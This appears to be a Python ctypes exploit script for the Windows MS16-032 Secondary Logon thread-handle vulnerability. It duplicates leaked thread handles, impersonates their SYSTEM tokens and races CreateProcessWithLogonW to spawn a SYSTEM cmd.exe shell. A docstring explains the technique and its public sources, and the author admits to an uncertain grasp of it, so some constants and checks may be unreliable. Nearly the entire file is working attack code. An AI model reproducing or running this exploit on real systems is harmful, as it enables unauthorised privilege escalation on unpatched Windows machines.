# -*- coding: utf-8 -*-
import ctypes 
import sys

from ctypes import *
from ctypes.wintypes import *
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool

""""
[PROCESS] python.exe (current process)
    |
    v
GetThreadHandle() -> svchost.exe (0x04) [THREAD] -> python.exe (hThread = (0x04))
    | our python.exe process now have a SYSTEM thread from Service Secondary Logon (svchost.exe)
    v
GetSystemToken(hThread) -> [SetThreadToken] -> [NtImpersonateThread] -> [OpenThreadToken]
    | Impersonate hThread with his own rights, now we got a SYSTEM Token handle in our current process.  
    v
DuplicateToken()
    | Duplicate the token (related to current hThread) in order to get into a variable
    v
[RACE CONDITION]
        |'->[IMPORTANT!!] 
        |   |
        |  '-> Our current process [python.exe] start to re-use OR create new threads, it means that  
        |      threads which have SYSTEM Tokens, should spawn new process with respectives permissions.
        |      (that's what i understood about it, but maybe it can be a wrong mindset)
        v
    SetThreadToken()
        | Use our token variable to impersonate hThread (current RACE CONDITION thread)
        v
    [THREAD] hThread
        |
        '-> [CreateProcessWithLogonW]
            | Now it's time to trigger a cmd.exe WITHOUT a SYSTEM credentials.
            | This function with [LOGON_NETCREDENTIALS_ONLY] parameter, can create a whatever process
            | without respective credentials, meaning that we can abuse and create a process in a CURRENT CONTEXT,
            | which means, if our current thread [hThread] have SYSTEM permissions, when CreateProcessWithLogonW is launched
            | it will get SYSTEM permissions too. That's how we get a privileged cmd.exe shell.

OBS: i don't really know about all shenanigans behind this technique, but the basics of basics i can understand
from James Forshaw white paper, Thanks!

References:
 - https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html
 - https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1
 - https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
"""

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.psapi
advapi32 = windll.advapi32
OpenProcessToken = advapi32.OpenProcessToken

# Constants.
ULONG_PTR = PVOID = LPVOID
LPSTR = c_char_p
LPBYTE = PBYTE = POINTER(BYTE)
HANDLE = c_void_p
QWORD = c_ulonglong
CHAR = c_char
NULL = 0x0

class _STARTUPINFOA(Structure):
    """Represent the _STARTUPINFOA on processthreadsapi"""
    _fields_ = [
        ("cb", DWORD),
        ("lpReserved", LPSTR),
        ("lpDesktop", LPSTR),
        ("lpTitle", LPSTR),
        ("dwX", DWORD),
        ("dwY", DWORD),
        ("dwXSize", DWORD),
        ("dwYSize", DWORD),
        ("dwXCountChars", DWORD),
        ("dwYCountChars", DWORD),
        ("dwFillAttribute", DWORD),
        ("dwFlags", DWORD),
        ("wShowWindow", WORD),
        ("cbReserved2", WORD),
        ("lpReserved2", LPBYTE),
        ("hStdInput", HANDLE),
        ("hStdOutput", HANDLE),
        ("hStdError", HANDLE),
    ]

class PROCESS_INFORMATION(Structure):
    """Represent the PROCESS_INFORMATION on processthreadsapi.h"""
    _fields_ = [
        ("hProcess", HANDLE),
        ("hThread", HANDLE),
        ("dwProcessId", DWORD),
        ("dwThreadId", DWORD),
    ]


class _SECURITY_QUALITY_OF_SERVICE(Structure):
    """Represent the PROCESS_INFORMATION on processthreadsapi.h"""
    _fields_ = [
        ("Length", DWORD),
        ("ImpersonationLevel", DWORD),
        ("ContextTrackingMode", DWORD),
        ("EffectiveOnly", BOOL),
    ]


class _TOKEN_ELEVATION(Structure):
    """Represent the _TOKEN_ELEVATION on winnt.h"""
    _fields_ = [
        ("TokenIsElevated", DWORD)
    ]


def GetThreadHandle():
    """Clone scvhost(0x04) thread into our current process context"""
    STARTF_USESTDHANDLES = 0x00000100
    si = _STARTUPINFOA()
    si.cb = sizeof(si)
    si.hStdInput = kernel32.GetCurrentThread()
    si.hStdOutput = kernel32.GetCurrentThread()
    si.hStdError = kernel32.GetCurrentThread()
    si.dwFlags = STARTF_USESTDHANDLES

    pi = PROCESS_INFORMATION()

    LOGON_NETCREDENTIALS_ONLY = 0x00000002
    CREATE_SUSPENDED = 0x00000004
    DUPLICATE_SAME_ACCESS = 0x00000002

    advapi32.CreateProcessWithLogonW(
        LPCWSTR("test"), LPCWSTR("test"), LPCWSTR("test"), 
        LOGON_NETCREDENTIALS_ONLY, None, LPCWSTR("C:\\Windows\\System32\\cmd.exe"), 
        CREATE_SUSPENDED, None, None, 
        byref(si), byref(pi)
    )
   
    hThread = HANDLE(0)
    kernel32.DuplicateHandle(
        pi.hProcess, HANDLE(0x4), 
        kernel32.GetCurrentProcess(), 
        addressof(hThread),
        0, None, DUPLICATE_SAME_ACCESS
    )

    kernel32.TerminateProcess(pi.hProcess, 1)
    kernel32.CloseHandle(pi.hProcess)
    kernel32.CloseHandle(pi.hThread)
    return hThread


def GetSystemToken(hThread):
    """ Impersonate (svchost.exe) [0x4] handle into current process
    in order to get SystemToken"""
    kernel32.SuspendThread(hThread) # Suspend thread just in case.

    sqos = _SECURITY_QUALITY_OF_SERVICE()
    sqos.Length = sizeof(sqos)
    sqos.ImpersonationLevel = 2
    advapi32.SetThreadToken(addressof(hThread), None)
    ntdll.NtImpersonateThread(hThread, hThread, byref(sqos))

    # Open a new copy of the token.
    TOKEN_ALL_ACCESS = 0xF00FF
    hToken = HANDLE(0)
    advapi32.OpenThreadToken(hThread, TOKEN_ALL_ACCESS, None, addressof(hToken))
    kernel32.ResumeThread(hThread)
    return hToken


if __name__ == "__main__":
    """Generate a bunch of threads [svchost.exe (Service Secondary Logon)] clones in our current process context (python.exe).
    Therefore, get uniq handle ids into an array, also these ids should be used to achieve a reliable 
    DUP and Race Condition phases 
    """
    MAX_PROCESSES = 1000
    hThread_array = []
    dwTid_array = []
    for i in range(0, MAX_PROCESSES):
        hThread = GetThreadHandle()
        dwTid = kernel32.GetThreadId(hThread)
        if dwTid not in dwTid_array:
            dwTid_array.append(dwTid)
            if hThread != 0:
                hThread_array.append(hThread)

    if len(hThread_array) == 0:
        print("[-] No valid thread handles were captured, exiting!")
        sys.exit(0) 
    else:
        print("[+] Got [%d] handles" % len(hThread_array))

    for hThread in hThread_array:
        hToken = GetSystemToken(hThread)
        print("[*] hThread: %s" % hThread)
        print("[*] hToken: %s" % hToken)

        hDuplicateTokenHandle = HANDLE(0)
        advapi32.DuplicateToken(hToken, 2, addressof(hDuplicateTokenHandle))

        print("[*] Starting Token/Process RACE CONDITION!!")        
        def Thread_Race(loop):
            """This race condition means that our python.exe process should create a new process, 
            using our previously duped token, therefore spawning cmd.exe using CreateProcessWithLogonW function.
            if we get some luck, this process should be called as an child process from a [NT/SYSTEM python.exe] thread.
            """ 
            for i in range(0, loop):
                advapi32.SetThreadToken(addressof(hThread), hDuplicateTokenHandle)
                si = _STARTUPINFOA()
                si.cb = sizeof(si)

                pi = PROCESS_INFORMATION()

                LOGON_NETCREDENTIALS_ONLY = 0x00000002
                DUPLICATE_SAME_ACCESS = 0x00000002

                CREATE_SUSPENDED = 0x00000004
                CREATE_NEW_CONSOLE = 0x00000010

                CallResult = advapi32.CreateProcessWithLogonW(
                    LPCWSTR("test"), LPCWSTR("test"), LPCWSTR("test"), 
                    LOGON_NETCREDENTIALS_ONLY, None, LPCWSTR("C:\\Windows\\System32\\cmd.exe"), 
                    CREATE_SUSPENDED, None, None, 
                    byref(si), byref(pi)
                )

                if CallResult <= 0:
                    continue

                hTokenHandle = HANDLE(0)
                MAXIMUM_ALLOWED = 0x28            
                tInfo = advapi32.OpenProcessToken(
                    pi.hProcess, 
                    MAXIMUM_ALLOWED, 
                    addressof(hTokenHandle)
                )

                if tInfo != 1:
                    print("[+] POPING SYSTEM SHELL")
                    kernel32.ResumeThread(pi.hThread)
                    raw_input(">>>")
                    return True

                kernel32.TerminateProcess(pi.hProcess, 1)
                kernel32.CloseHandle(pi.hProcess)
                kernel32.CloseHandle(pi.hThread)

        pool = ThreadPool(20)
        results = pool.map(Thread_Race, range(0, 9)) # Optmized cmd.exe POPUP (if it fail, just re-run!)  
        pool.close()
        pool.join()

        
